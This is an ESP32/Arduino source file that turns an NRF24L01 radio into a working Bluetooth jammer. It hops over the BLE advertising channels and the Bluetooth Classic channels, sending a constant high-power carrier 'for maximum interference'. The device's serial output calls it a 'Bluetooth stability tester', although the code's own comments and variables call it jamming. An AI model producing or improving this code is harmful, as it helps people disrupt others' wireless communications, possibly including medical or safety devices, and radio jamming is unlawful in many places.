#include <Arduino.h>
#include <SPI.h>
#include <RF24.h>

// --- Pin Definitions for your setup ---
#define BUTTON_PIN 0  // Built-in BOOT button on most ESP32 boards
#define LED_PIN 2     // Built-in LED on most ESP32 boards

// --- SPI and Radio Configuration ---
// 16 Mhz SPI speed
constexpr int SPI_SPEED = 16000000;

// NRF24L01 on CE -> GPIO16, CSN -> GPIO15
// This matches your wiring. The library will use the default SPI pins (SCK, MOSI, MISO).
RF24 radio(16, 15, SPI_SPEED);

// --- Channel Definitions ---
// BLE Advertising channels (2402MHz, 2426MHz, 2480MHz) - NRF24L01 uses different channel numbering
int ble_channels[] = {2, 26, 80};

// Bluetooth classic channels (2402–2480 MHz) - NRF24L01 channels are the same plus 2 MHz
int bluetooth_channels[79];
// Channels will be populated in setup()

// --- Jamming State Variables ---
// Start in BLE mode and press the button again to switch to classic channels
bool classicMode = false;
bool jammingOn = false;
unsigned long lastHopTime = 0;
unsigned long lastOutputTime = 0;
unsigned long hopInterval = 100;  // microseconds (time between channel hops)
unsigned long hopCount = 0;

bool buttonState = HIGH;
bool lastButtonState = HIGH;

// Data to transmit (random noise)
uint8_t payload[32];

// =================================================================
// == FUNCTION PROTOTYPES (Required for PlatformIO) ==
// =================================================================
void setupRadio(RF24& radio_module);
void sendRandomPacket();
// =================================================================


void setup() {
  delay(2000); // Delay for serial monitor to connect

  // Generate random payload
  for (uint8_t i = 0; i < 32; i++) payload[i] = random(256);

  // Populate Bluetooth classic channels (2 to 80)
  for (int i = 0; i < 79; i++) {
    bluetooth_channels[i] = i + 2; // 2402 MHz + (i MHz) maps to channel i+2
  }

  // Start serial monitor for debugging
  Serial.begin(115200);
  SPI.begin(13, 12, 14, 15);
  Serial.println("Device started. Initializing for single radio module...");
  Serial.println("Bluetooth stability tester is starting...");

  // Setup Button & LED
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW); // Start with LED off

  // --- Initialize the single radio module ---
  // Check if the radio has started ok
  while (!radio.begin()) {
    Serial.println(F("Radio init failed. Check wiring."));
    delay(1000);
  }
  Serial.println(F("Radio initialized successfully."));

  // Configure the radio module's settings
  setupRadio(radio);

  delay(1000);
  
  Serial.println("Setup complete.\n\nPress BOOT to start transmitting...\nPress it again to switch to BT classic mode...\n");
}

// Function to configure the radio for jamming
void setupRadio(RF24& radio_module) {
  radio_module.setAutoAck(false);            // Disable auto acknowledgement
  radio_module.setRetries(0, 0);             // No retries
  radio_module.disableCRC();                 // Disable CRC validation
  radio_module.setDataRate(RF24_2MBPS);      // High data rate for maximum traffic
  // *** CHANGE: Use lower power for stability when powered from ESP32 3.3V pin ***
  radio_module.setPALevel(RF24_PA_HIGH, true); // Low power for safety
  radio_module.setPayloadSize(32);           // Standard BLE packet size
  radio_module.stopListening();              // Ensure we are in transmit mode
  radio_module.powerUp();
  radio_module.setAddressWidth(3);           // Shorter address for faster switching
}

// Function to switch from BLE mode to Bluetooth Classic mode
void setClassicMode() {
  Serial.println("Switching to Bluetooth Classic channels...");
  classicMode = true;
  hopCount = 0; // Reset hop counter for the new mode
}

void loop() {
  // Get debugging info using serial monitor
  if (Serial.available() > 0) {
    String serialInput = Serial.readStringUntil('\n');
    serialInput.trim();

    // If 'debug' is typed, show debugging info for the radio
    if (serialInput == "debug") {
      Serial.println("Radio debugging info...");
      radio.printPrettyDetails();
    }
  }
  
  // --- Button Handling for Start/Stop/Mode Switch ---
  buttonState = digitalRead(BUTTON_PIN);
  if (buttonState == LOW && lastButtonState == HIGH) {
    if (jammingOn && classicMode) {
      // Stop jamming
      jammingOn = false;
      digitalWrite(LED_PIN, LOW); // Turn LED off
      Serial.println("\nTransmission stopped.\n");
      ESP.restart(); // Reset device to clean state
    } else if (jammingOn) {
      // Switch modes and continue
      setClassicMode();
    } else {
      // Start jamming
      jammingOn = true;
      digitalWrite(LED_PIN, HIGH); // Turn LED on
      Serial.println("Start transmitting...");
    }
    delay(200); // Simple button debounce
  }
  lastButtonState = buttonState;

  // --- Main Transmission Logic ---
  // If the transmitter is on and it's time to hop to the next channel
  if (jammingOn && (micros() - lastHopTime >= hopInterval)) {
    sendRandomPacket();
    
    hopCount++;
    lastHopTime = micros();

    // Debug output every 5 seconds
    if (millis() - lastOutputTime >= 5000 && hopCount) {
      lastOutputTime = millis();

      Serial.print("Transmitted on ");
      if (classicMode) {
        Serial.print("Classic BT");
      } else {
        Serial.print("BLE");
      }
      Serial.print(" channels " + String(hopCount) + " times.");
      Serial.println();
    }
  }
}

void sendRandomPacket() {
  // Use a static variable to keep track of the current channel index
  static uint8_t current_channel_index = 0;

  int* channels_to_use;
  int num_channels_in_mode;

  if (classicMode) {
    channels_to_use = bluetooth_channels;
    num_channels_in_mode = sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]);
  } else {
    channels_to_use = ble_channels;
    num_channels_in_mode = sizeof(ble_channels) / sizeof(ble_channels[0]);
  }

  // Set the radio to the next channel in the list
  radio.setChannel(channels_to_use[current_channel_index]);
  
  // *** REVERT: Use the constant carrier for maximum interference ***
  radio.startConstCarrier(RF24_PA_HIGH, channels_to_use[current_channel_index]); // We will change PA_LOW next

  // Move to the next channel, and wrap around to the beginning if we reach the end
  current_channel_index = (current_channel_index + 1) % num_channels_in_mode;
}